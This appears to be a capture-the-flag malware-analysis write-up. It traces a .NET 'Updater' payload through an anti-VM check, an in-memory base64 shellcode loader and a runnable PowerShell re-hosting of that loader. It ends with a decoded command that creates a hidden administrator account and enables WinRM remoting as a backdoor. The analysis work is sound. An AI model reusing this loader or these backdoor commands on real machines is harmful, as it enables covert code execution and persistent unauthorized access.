elpTVzk2YnVSRy9Xd0k2a216VEdvUWZBVllWT210R2JuVElXdXVDczFBNGtGMERUS3A1ZTVlUzdpZ2dkMmlXZVNjQUloVTRxSG5jNkVDS0ZwanZyYy9CV1czV1liU09wT2lUcWhwclNJK3VCdExJWGRKRSs4TE1ZRFd2VXo1RTdkU2U3V1VaZnNxY1gybWR2QXAzY2c4UkVDbzRQdFp2Sng2K1RPYVFYYXdVcktkTXl5S2J3YUNaSHNSbEtkTGh0SXlpZjZOamowSFZuSnFaVGZEVUNFVml1YVdjdVhuUmszOEFBM0dBN0I1UVZONGhYRVFkOUUrUFRuQ2VwNURpM05BSnUwQ0lBeklHK0tpMVNuTWZKRkgwLytyOXBjR0pFY0MvREdNMlFkTEwzZDRpOGtrbjQwQ1pNSy9CL0N1bWZBQ3dpMFZZWUQwcnBycXd5TXEyUlZmTWNKaThpMXgyRDN5Z2p6Zy9TWW4rdnpqYzhLNFpVLzMxVFl2RE1KdktCMUt3VWRKQ3VLUVB2T0NFc250aUZuekFxZWxiK3pDTWxWbGg4OThGV2N4NktpZmxvUFBKbXYrWmQ1RTgxWFY5ZG91TnUxL0NRbGlpaGJtbkpGOW5waGx5bjRCTWZNVDAzN0k1Rmg5c1Z2NU1GdnRpVi9jVUZmVThzSGYrT05OOGluakJlRkNXWXNPUi9oM1FuYWZpbE1qN1loMGtlRjhLN2lQUTRiSm5DaGNmakpua3RkVVFoMzdJNzhYL0xkcnZxcWNYelNsVEsvSUtrV014ekJ3cGJWYTlobzlVYUpaN04rZlZOWmdHRjdtR3FtRTRtQ2h3NGE1djFlQWwvZXNsNFJzbmRGaGtlVWc3MENQRUlZQ0hTSGlpREZPdHFDdTYzYVhUdFQvaE9ST210NWVrZkhXVTBqdXhJdHFlU1ZYSVg1eVNJQUVuUEhETHlJaHp3dW8zRm5NcG8rZUVubUV2WjJUUzFzWHgwaGE3UFRnTTdPSDcyZFpuVDRmS09icFZLTU5hbVBZM0EwK0hqVlFPaXhsYVN1d2dqOGlxbTRVL0JyeGI3ZDF5MG8zdFg3ZXdVUkwveHVtM2dVdWZPZlBYaUJiQ0NGbmk4VEJ2Mzh4T2FvSWR0OW1qN0xIM3gyb3A4SG5vcjNqVmdjaUtLT2FKL0xjSkxuZG11NmdWVUlKbWxSUENzSk96VC9kU3dsT3BIeFN2cUxYTWU1WDFkekxVMTNMYVRhWDlkNEpMY1FDSjB1RHRMK3plMkF5TzhMdjZRYTZEd05OdTBndGJ6TGs0dWQ3ekxoTUI5Qkg3dSs5aThSQUpiRG9na1Z4UWs1a2VuVXMvSUg4VGo2SDQ0VFkzMHBDRk44dXZ1dmpNb3ByZnprZlQ2dzJYSDJ5TUhPelp6NFBtdmtXVEtqRTNhQWp6RDUzdmlpSzVXeU14M3NicmpxRllwMDk1aUhtZElyVGNVZXNOSjkyL0VBRG9ibnFyR3FLa0NhOHZTUGpPOUtjV1FKWWJ3Rm5SRUkzRnhrTXcvWllxOGF3YTBXYnIxT3lTVlp6ZWJLcDEyQjBOaGZCV1YyZzF1UVRCVnV3VmNxL1l0ZjJIR2gwdmV0bHRxTWpYZmJrSVZyV3BwbUZxUGtVRFl5M3h5UUtrc0N0bzdWeStlSXFxVE9aTTRjUGR5aVlUbCtEVVJPNzcyQjUzdjhMVVpnVHAwSnBUNm5WU0lJbDVuZFdMU1dmcy92eVE3YmtNYnMwTEpKVkR2a2VoQWdHRWxJUEd4V1RHVmg1VERnNUxCeXhwQXEwTm50OHNENUhPNTNOSmsraU5GWDF5aVJWVExkTkNUa1c0K051UndOYmNoeXpacW9KejRUWUcrQUJrZGZHUWpBK2l0aEtSWGtsR0gxTGtsNE1uRDF2UkMxOUdzUXp3UkEvWFlkaDllYUlzR3ZPSFZVV0t1NGsyZG8rQVZ1MWMvNEZ2eVZOYTRiUEVoU2FSaFNPc0QrSlZJcFdSZm8yVG1ScXNZcDFSeXJnbktraGxZWUt3STZGc0pmMkJyb3ZJa0QzREZlSThEZWEyQm5QWXdmYm16QzRsZzJtU0oxb2VmTWNDMGJSc2xhMG4rMmVIRkh4bHdpNGUyMkk3b1YyRjR1dG5OZWRMeEV5YzUySHhiQ2dleFNGVkxZRTZzUFo5L1JVVjBRRm1sRnlyWlhqU1p1aDBhQVMwNVpYMnNrVW12SEY3eFFHcmwzckR4SENuZ0JQaVkrbzVQUGtYUUQ0VGVTRWlLdVNnaUxibzY3THhaSGpEM2lIUWVWd3ZDb1NXMWpEeE4yTjNoR3dpWXJDU3JvTC94MTJZbENrN09RQWNVcDhnb0NzS056R2kvanV4cUlrTkZOZlA4WjZrejBOZjl3UUFPdFlhMW1WSUdZa2c4ZitaUTVGQjB2NEJWVlRDRTN5djcvbENEQUNLeWhtRmpDVnJWcmxoRnMzdThIZXNvbFZJVnJQajdJOXpUbXc5MjRUSFJJZjk4WUppMEJ6ZkUvdnA1M3d4NHhGT25xeVd6VjNyVEZDbFFFQkhUSTB0S3lGdmZuT213cllRakhYc1U4REp1Rzg0aTRRbDVoK1NjYS90SDhNbm4wV3RHVDh4dzJIVi85TUlqQjdMbW5NMUVJVDFHdjdrNkNHcHVoRFE4OHhpVVZTZGF5azhaZnBnWXRxTStpVVRCdnpkNVpOTkVCR2g5SE9OYXo4Tmc2UE1BSmIrdEIyMkxRYXh1SEIva0NHOTZlSElHTVhBeUovaXhBaEJNUGk2aURkQWdGWldDSDZiaGRpREhwM2N0eURLUTBBcWF6OG1OdXZQSzJUSDdQbWVsNGRsYzh6MlVvS1kwdmRnODJyMkdGUmh6Q2NYZEQ2ZGVUeWJ1THlFRUFNZFZDRkJ0eEptL21maVJzQ1ZydmI3QnBnRmt1UWpHTjdmdFRKMEs4ZXFWVGRGSGhBWVFJRHkva0tYeTRxWU85QXczUktmUjZacFNISkJwZjFzMFVBME4wc1F0V0tvT05OM1BuUWQ2NURRdFpIRXhtVU0vSzE1UGhHQmtMSUxRU29qNXI3MGQzMldPL25KL3loZmIzeHZScXlybUx6ZHFjL2VTMWU0bUlKdWJlWVJLQ21OT2xiL2JwSmVKQkJxZTZjVkFqcHpJay9xc0JUekRmS1FDcDJQS0c4dWxlQ3I4Z09RTDVMWEtmSzVEYzI5bk1RRm9EbGhxWlpURVByTEtVc25nVjFFd2swUnFjb0o0aHc4YzdtOURCdGc1YThOZzNZcEVQZjNaNGJnL2p0N3ZSOCtwdUs5K2dzcXcrTGZrWmYzMFZDb3FYL2FuM2pCSE1laHYwVk40cWx2Y0NuOWRGT21Tcy9mSlNoWkNaSHhpSVlDcENjYnhkRW0xS1ozYVErWlhEUE4vaTBvNmZyd0hBd3p0Z3RtWS9OS09SNmVKK3hST2ZkbzZXVVBjcnJYS1dWczh5QUNnRjF4d1lmWlA1K3ovcHNpdGtZTDhxY1JzWkplL3o5V0xHM0s5Rjh4YUxxcHo4Q2liQjRONkhqUzlwcDFkY0NHZXE0OW0vZGtQc0RpaTVQa3JybFFZL1M3SzZTb3ZYR2tBS3h0eWxLSTNHY1lpT3I4NHZld3BMRER2WE45ZWVqa0NzeVJEd1MzVm52aHQyK2I5anFROGFnZDRoOFp1R0pwTnF3RVdJamppcmZ0b3YxeVJybDlKRlNDV29WNnRXa0FWRnZua1JtVEFKemowTGxyYzBIbGxEQ3dhRnU4SHV3cHZIZFYxa0VIVk9sNjFBWkIyTEs5MkFwUlpqNXppb29oT2hGZEJmMGN5SmFGK0JKK3ptQzd5YTdFa1AvdXZtVXZ5bkZQQXVLYXBIVlpDUElkMElneitrblVJOHlTM2J3ZXpzRHp3bjd2c1pvK0FqREh6SWpWNHlVR3F3ZmZuQkRMdUJHRFBibGcrRTBWSEZDdnJZZlBxNThqYnc4R1A2dkpLLzI3TC9SYWtXbVc1KzBQbGpDa3A3S2JhSVJQV2RETlFoZVV6YklGanlhTzN3ZnZEN21YVGRmTEJoVUMvR2doY3VZQUxYUjRaV21qaHBhTVRiUHEvc2dUNm9VTWxjRDZockU0TWlKZlZySnZTSUFsYU5PU1VRemFSNURuM1lQRVh2VXdDMHMwam9ZTjBwRDRBUW9LUTVyS3BmQTV0clU2SkZVTlNHVFdSSkk4clo3QXRlRkpMSk4xTnZyQmVaOW95TjlYVEs4WWlwVmNja0FnNE5qaGhtNkRIUG93VE0rSXNLOXFSUWxxU2lkTmo2TkNRckFoRldSRXJPQXIwclRCOUtkK0tmQXgxQXBuaVVYNTd6L2o3TUJsT1BVZytPcnlPaDFnbFc4K2o5Y045Nmk0bjlDeUg2bWZXQ1hwblN3bGVHb20vNXlOUTBEVXdqZ0ZET2VheUdkQktsWEU3NlpSTEpRdW42bmtlYTNsY3dnbzNwdjdJOEVMUHZXRzBCNTN6cFlaV3liUVZiNXhLWHlGR013N3kwYnVmZytsZGtYZGI4OVJEN3BpUXZ1R0lFWitoVkRKclI2cmFGYi9FbjBYaEFuWTJFM3J5THBNa0txM3ZQUTA5TlpkdkYzN1dOSmk0SUk2c3FYeTVFVkNrTHR6bCtPdGRXUFVXd0g0MVNvV1VPTk5aMFJiOC96VnBKSHNmNjNwcXBQZXNQNmFKNEk1dU1BUFFMSHdGWUxnQjA1UndobDh4cDlRc0s0NWNXTzcyL3k2Y2tlSnR6cnFYYnFRUGVFRnNEalI1TWlOQ3UvMXkvNU94eDBnMzVWandTSEtmZllabUZWVUFGcUNaV2dFV0R4ZmlzenVQTm1rd2tkWnFIOGhWMi9yN1dwc01vRGdGN1pvV0VJdjVlQ0FhdkJCV0wzWDNlanR0WjAyWkhFc1AvaXBqSUhZM0FWaUlacTVaUStaSXJOQ1gwU0lrOUV0Y3M2b2dMUkdYb1VLa2xFSUdrQTJPWnlKd3cvaFdUakh3WWxoNG5GUm9YWkQ2Nll6RWgyekwxZEU3STVRMll5cGZvT3psQlVBRTdtSnpUZXl2eGFBQWtBWTdnNjdSaG0wN3ZiaUhqLzFSQmtSaUlOcnVnL2hzaGQ2Sm85a0Q4SEkrRXh6TStTbjhiSXE5RS9TWVBNd2VJVDBITVZ6dnpmbCtRdjdENnNHb05QREZSaXRNc2lJU0wycC9ES0NzMkU4SVM5R3ZNOVhHVG15dkMrZnZUVlpkbWI1QWYzUWxJZlVoemsxMzQ2eUxmVFNZN0huT20wTEVPMFlkZ3JGdUllcnNsWTRWRUZNalpTS05ZNGpzckhscG9ROHRXNEFZbHNTVlRQb2V3SkZndHh2ZVJ2cW5LTklBL0RjMHBqUHhwclRSUStyWERXc2s4OUpzL0lDaWltak5aaXlZbjBMMCthakgrUlBleDg2NnVEakRCOGxDYTNPMjduTTVPYW4wcjlTL3g3bmxscmptRVJxazdjRFAzUUhLVUNrdDB0UUhBdjFEK2hNMmRpMjJPays0UlZXSzVmcjlkelQvSnlzMVNrWVFFdFU2bTJtV3R5ejlnVDVmN0tkWkMwY3dUZU5ERmFWQTNvbFZraXVSRU44ekR6RFZKMVYwNkJQQ1E4b0JqYXNrSjY5cEx2aDRlSXliR1IveFhsVXE2ZDhXM2l1bzZFazhHaEVXTkhVUXBIc3Fzc3crMUFMdldjZWZmWUlPMGxubDhLMktmNWxWcEFqQkJVZ0phYTJGeE1jS0ljSEo3RFpMSnRtUm5Bb2dsQjZYMVdnU3R0eUhUU2JyeVhOYkNGSWg3RUJmM1dBWW1UTG84UEMydmNkUlVhQlJpdEx0WlZtaTNWczZuM0dVbmdDNzFacjRiMHFEdG50MGl1T0I1QUVGbU9neEVXS2lnRlhuakJwZDM2SFh4MFBuZmxCb2ZIcVhJZWRxNmpJU2pyUVBWbDRmUDlyQjhZbE8wTHlaZTI5cGVOaHFQaGxpMmVSdTBLUmVqV3JERGlwZHBGa0lheGdIZEJxdTg1Q2k2UElJcGxVSXBlZFhCVlF5SExvZE1ndW1PY2dOOExTbm9NaFVaaStjcHFLSkxrcHdqUjluWHpuOHdEeS9JRjdrRkV2Vk1aZ2M2U1l3d08wbXZ6cE9IcmFiZk5uTWJqa2FwaHo0MkhKTzVCUHN6SURhMS9LOW1IcHBSbWQ0dUttV3NvTHhwaXVQWkk4WmY1SGV4S041U0NJbVBya3Q1Y1BVYVZ2cTVhbkNub0doanprSHZUb0hacGxhWFZ1RjVMZVU4Y3hyd29sdERiVkYrb2NEMkRYNXNmWWltbzZaVjNPRGtIN1RDV1ZmL1llWXBkcEd0bTl4bUZ1cjNDYTBYMkx4SFA2a2lPbVdJM0d5LytscWk1cW5HMndaMml5Vm9HMjhnODZGQUFldUhLZGRaemNrVlVGNGV2UGkvK3lNWHZwUy9zZnM5clFxY01uOWt2MmMyUCt6NVp3UFlzRllsZkhnLzkyOXBXU0QxWjNIRUx1K1EwbFlKZzJOWDNWNGlhOHpSanc1VDg4ZVMvT0FBK3V0S3RQTjYwdjAwOWU2c0hiNnRxMXFjRVh0UUtsN2U1bXJCbm1vSkVudXc1RTJFTnBRZnpUU3p6b285a3ZuUy9tbVNFYVVwd3BwYVhGdnE2QlBXUjEyaHlVZ1YzYi9CWWNPN2cvMWlvSm8wOVVkcWRPa2N5ODZEQjBhd3EzaC9WYUZGdXl6ck9hTFAzdmpCaHRjL2RPQXJEY2FNVnBTS3hqRUU3UnhTWEdibERCUmY1K0h2U01ZYmdINlpYZjh5Y1JaQzkzMENsNkI1aTNTbjlONVJJc2RTMkpCOFYrS3ZGcmVVRGJUY3FRVERtaHI4U3lKa0IxK0ZJN2pVL0JSaUs1NUVEY3U2VVVJbU1ZUlBETEV2YWNYY1RjWjc2TjAzTThBSjdaQndKbFhRd3crN1hadW5JWXpTYTR2THMvM1hTcjNKRm5iUDZ6L1BuSTR6bnhpUkFrQlBud1FLMG9JQ3ZsR29EODY1aDFTOGliT1Jsa2FnVmVxOEM1Q3grR25iODVwMU14TE9Pb016Ni9DUWMxZE9nakJxb2hYZkVTZS9uK3RCam5Rb3ZBN05WODg3R0JxelVybVRGU0JnRHB5MTVBMWVLMlA0elFwNlltMmY2azF2YkxCQzJLY2IwVlp0aTZPZ0g2WHhWM1VybS90bEU2Z0J5dmJnNkcyWndWUkVic055YkFub3NjbFErL1gvbTVTL0FWdFpENkJLY2liM296bUpScC85VGNIMWcwckhoMXZXc3NlRUROKzBBRGJ0YzVrYU82RWt5R0VGdUFnZHh2bVdpOXdIVllwSlNWb0VhQ21NaDVlOHVGb2IvK05vZWdoNGdIYWQ5TjR5RDVmZERmNFZXS2xJcmUzM055OFFpVFB1MGZDRWNpMlZreVBuN2VZYW9DOW5taUFWRjhZNDZrQW1XZUtXc0cxNlFBUzhmZEc4MzdlRWw4Q1JvWS9XdXBEMVZEZGZiTlRmbG1QSkh5RitzMTZGRkVVTmZMYmFyUGF0eHd0dVRkbU80ZDRBWXFsbU5MK0hpbUpyb2dIazhrck56c0VOMnl0VFhaWEx2WndZMkZVcFB5QkpybElrMmJVN1ArQ1VleHBsKzBYTzlZbGRyaFNFSWZMWWMrSlNxTTMxSThhUFhleEdEY1krM1Y3aDZFU0hrbnQ5MWljNUQwakp2QnFDWGVZOWZLNlU0bHRmV203YkRmdS9zNFZFQVRPYy9sajhHSW1EVldFMXpIU3IyK2U3Z3J1RnlkcFRDQmF2QkhwYmoyYUcrbWpFT3hsdTdseXh6TGNmbVlVUXFoQ2trSXhkb1FDb3hKMytOL2ZCQUFMQTdZWVhoVTlPbTU1MTJCWndpWTUyL0FjMW1oVmN5a2E1SnBQSDhIakJKRT0

After decoding and decrypting font-unix I received a .NET pe. Inspecting the .NET PE in dnspy, I found an Updater class which contains 3 components.

- Main function
- Anti-VM
- base64 decode and exec

Main function named Run
```c#


public static void Run()
		{
			try
			{
				bool flag = !Updater.isVirtual();
				if (flag)
				{
					Updater.boom();
				}
			}
			catch
			{
			}
		}
```

Anti-VM check named isVirtual
```
private static bool isVirtual()
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				try
				{
					using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
					{
						foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
						{
							string text = managementBaseObject["Manufacturer"].ToString().ToLower();
							bool flag = (text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox";
							if (flag)
							{
								return true;
							}
						}
					}
				}
				catch
				{
					return true;
				}
			}
			return false;
		}
```

Base64 decode and Execute named boom
```
private static void boom()
		{
			byte[] array = Convert.FromBase64String("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");
			IntPtr intPtr = Updater.VirtualAlloc(IntPtr.Zero, (uint)array.Length, 4096U, 64U);
			Marshal.Copy(array, 0, intPtr, array.Length);
			Updater.func func = (Updater.func)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(Updater.func));
			func();
			Updater.VirtualFree(intPtr, 0U, 32768U);
		}
```

I couldn't properly execute and monitor the activity because the process immediately terminates.  I imported the Updater class into an add-type (Inline C# code) within PowerShell and execute main.  I made sure to remove the anti-vm method and ran it against a sandbox.

```ps
Add-Type @"
    using System;
    using System.Management;
    using System.Runtime.InteropServices;

    public class Updater
    {
        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
        private static extern IntPtr VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        public static void Run()
        {
            try
            {
                Updater.boom();
            }
            catch
            {
            }
        }

        private static void boom()
        {
            byte[] array = Convert.FromBase64String("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");
            IntPtr intPtr = Updater.VirtualAlloc(IntPtr.Zero, (uint)array.Length, 4096U, 64U);
            Marshal.Copy(array, 0, intPtr, array.Length);
            Updater.func func = (Updater.func)Marshal.GetDelegateForFunctionPointer(intPtr, typeof(Updater.func));
            func();
            Updater.VirtualFree(intPtr, 0U, 32768U);
        }
        private delegate void func();
    }
"@


[Updater]::Run()
```

Results https://tria.ge/230320-arhmzsch7v/behavioral2 show a PowerShell command executing a base64 encoded command containing the flag.

```
powershell.exe -WindowStyle Hidden -NoProfile -EncodedCommand JABwAGEAcwBzAHcAbwByAGQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgACIAUwB1AHAAMwByAFMAMwBjAHUAcgAzAFAAQAA1AHMAVwAwAHIAZAAhACEAIgAgAC0AQQBzAFAAbABhAGkAbgBUAGUAeAB0ACAALQBGAG8AcgBjAGUADQAKAE4AZQB3AC0ATABvAGMAYQBsAFUAcwBlAHIAIAAiAEEAbgB1AGIAaQBzACIAIAAtAFAAYQBzAHMAdwBvAHIAZAAgACQAcABhAHMAcwB3AG8AcgBkACAALQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AIAAiAEgAVABCAHsAdwBzAGwAXwBvAHgAMQBkADQAdAAxADAAbgBfADQAbgBkAF8AcgB1AHMAdAB5AF8AbQAzAG0AMAByAHkAXwA0AHIAdAAxAGYANABjAHQAcwAhACEAfQAiAA0ACgBBAGQAZAAtAEwAbwBjAGEAbABHAHIAbwB1AHAATQBlAG0AYgBlAHIAIAAtAEcAcgBvAHUAcAAgACIAQQBkAG0AaQBuAGkAcwB0AHIAYQB0AG8AcgBzACIAIAAtAE0AZQBtAGIAZQByACAAIgBBAG4AdQBiAGkAcwAiAA0ACgBFAG4AYQBiAGwAZQAtAFAAUwBSAGUAbQBvAHQAaQBuAGcAIAAtAEYAbwByAGMAZQANAAoAUwB0AGEAcgB0AC0AUwBlAHIAdgBpAGMAZQAgAFcAaQBuAFIATQANAAoAUwBlAHQALQBTAGUAcgB2AGkAYwBlACAAVwBpAG4AUgBNACAALQBTAHQAYQByAHQAdQBwAFQAeQBwAGUAIABBAHUAdABvAG0AYQB0AGkAYwA=

Base64 decoding

$password = ConvertTo-SecureString "Sup3rS3cur3P@5sW0rd!!" -AsPlainText -Force
New-LocalUser "Anubis" -Password $password -Description "HTB{wsl_ox1d4t10n_4nd_rusty_m3m0ry_4rt1f4cts!!}"
Add-LocalGroupMember -Group "Administrators" -Member "Anubis"
Enable-PSRemoting -Force
Start-Service WinRM
Set-Service WinRM -StartupType Automatic
```
